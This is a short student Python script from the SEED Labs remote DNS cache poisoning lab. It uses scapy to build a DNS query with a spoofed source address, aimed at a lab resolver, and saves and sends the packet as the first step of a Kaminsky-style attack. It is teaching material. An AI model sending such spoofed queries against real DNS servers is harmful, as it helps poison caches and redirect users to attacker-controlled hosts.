"""
SEED Labs – Remote DNS Cache Poisoning Attack Lab
3.2 Task 4: Construct DNS request
By: Dana Zorohov 207817529, Nir Meir 313229106
"""

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import IP, UDP

Qdsec = DNSQR(qname='twysw.example.com')
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=Qdsec)
ip = IP(dst='10.0.2.10', src='1.2.3.4')  # from a random src to local DNS server
udp = UDP(dport=53, sport=12345, chksum=0)
request = ip / udp / dns

# Save the packet data to a file
with open('DNSreq.bin', 'wb') as f:
    f.write(bytes(request))
    request.show()
send(request)
